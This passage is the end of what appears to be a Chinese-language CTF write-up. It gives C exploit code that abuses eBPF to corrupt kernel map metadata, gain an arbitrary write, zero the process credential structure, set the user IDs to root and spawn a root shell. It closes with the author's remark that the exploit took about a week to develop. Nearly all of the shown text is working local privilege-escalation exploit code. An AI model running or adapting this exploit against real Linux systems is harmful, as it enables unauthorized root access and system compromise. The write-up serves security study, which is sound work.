      BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_9, 0), // overwrite ops to target

      BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x10), // r8 = &map->type
      BPF_ST_MEM(BPF_W, BPF_REG_8, 0, BPF_MAP_TYPE_STACK),

      BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x8 + 4), // r8 = &map->max_entries
      BPF_ST_MEM(BPF_W, BPF_REG_8, 0, 0xffffffff),

      BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x8), // r8 = &map->spin_lock_off
      BPF_ST_MEM(BPF_W, BPF_REG_8, 0, 0),

      BPF_MOV64_IMM(BPF_REG_0, 0), BPF_EXIT_INSN()};

  writer_fd =
      prog_load(writer_prog, sizeof(writer_prog) / sizeof(struct bpf_insn));
  printf("[+] writer_fd = %d\n", writer_fd);

  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) < 0) {
    die("[!] Failed in socketpair");
  }
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &writer_fd,
                 sizeof(writer_fd)) < 0) {
    die("[!] Failed to attach BPF");
  }
  puts("[+] Writer ATTACH_BPF");
  writer_sock = socks[1];

  if (send(writer_sock, HELLO_MSG, MSG_LEN, 0) < 0) {
    die("[!] Failed to send HELLO_MSG");
  }
  // ! Don't write too much
  for (uint32_t i = 0; i < 8; i++) {
    aaw2zero(cred + i * 4);
  }

  unsigned int ruid, euid, suid;
  setresuid(0, 0, 0);
  getresuid(&ruid, &euid, &suid);
  printf("[+] ruid: %u, euid: %u, suid: %u\n", ruid, euid, suid);

  pop_shell();

  return 0;
}

```

这个题目从对ebpf完全不熟悉到写出完整的利用脚本大概花费了7天左右。虽然过程很痛苦，但是学到了很多新东西。

